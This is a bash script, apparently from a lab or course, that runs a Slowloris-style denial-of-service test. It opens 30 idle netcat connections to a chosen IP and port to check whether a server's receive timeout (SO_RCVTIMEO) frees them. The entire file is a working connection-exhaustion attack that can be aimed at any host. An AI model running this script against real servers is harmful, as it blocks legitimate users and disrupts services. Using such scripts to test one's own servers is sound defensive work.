#!/bin/bash
# Attack 2: Slowloris Attack (Manual Cleanup Version)
#
# Purpose:
#   Test SO_RCVTIMEO timeout mechanism by creating connections that
#   never send data. This simulates a Slowloris DoS attack where
#   attackers hold connections open without sending data, exhausting
#   the server's connection pool.
#
# Expected Results:
#   - server_bad (NO_ROBUST): Connections stay open indefinitely,
#     blocking new legitimate connections
#   - server_good: Connections timeout after 5 seconds and are
#     automatically cleaned up (SO_RCVTIMEO working)

# Accept IP and PORT as arguments
TARGET_IP="${1:-127.0.0.1}"
PORT="${2:-8080}"
NUM_CONNECTIONS=30

echo "=== Attack 2: Slowloris Attack ==="
echo "Target: $TARGET_IP:$PORT"
echo "Attempting to create $NUM_CONNECTIONS idle connections..."
echo ""

# Check if nc is available
if ! command -v nc &> /dev/null; then
    echo "ERROR: netcat (nc) is not installed"
    echo "Please install it with: sudo apt-get install netcat"
    exit 1
fi

SUCCESSFUL=0
FAILED=0

# Create connections that stay open
for i in $(seq 1 $NUM_CONNECTIONS); do
    # Try to create connection
    (tail -f /dev/null | nc $TARGET_IP $PORT > /dev/null 2>&1) &
    NC_PID=$!
    
    # Wait a bit to see if connection succeeds
    sleep 0.2
    
    # Check if the nc process is still running
    if ps -p $NC_PID > /dev/null 2>&1; then
        echo "[$i] ✅ Connection established (PID: $NC_PID)"
        SUCCESSFUL=$((SUCCESSFUL + 1))
    else
        echo "[$i] ❌ Connection FAILED - Server may be full or unreachable"
        FAILED=$((FAILED + 1))
    fi
done

echo ""
echo "=== Attack Summary ==="
echo "Successful connections: $SUCCESSFUL"
echo "Failed connections: $FAILED"
echo ""

if [ $FAILED -gt 0 ]; then
    echo "⚠️  ATTACK SUCCESS: Server connection pool is EXHAUSTED!"
    echo "   Server cannot accept new connections (DoS condition achieved)"
    echo ""
fi

echo "Monitoring instructions:"
echo "  1. Check established connections:"
echo "     netstat -an | grep $PORT | grep ESTABLISHED | wc -l"
echo ""
echo "  2. Check server child processes:"
echo "     pgrep -P \$(pgrep -f 'server_(good|bad) $PORT') | wc -l"
echo ""
echo "  3. Try connecting a legitimate client:"
echo "     ./build/client $TARGET_IP $PORT"
echo ""
echo "To cleanup connections manually, run:"
echo "  killall -9 nc tail"
echo ""
echo "Press Ctrl+C to exit (connections will remain open)"

# Keep script running
while true; do
    sleep 1
done
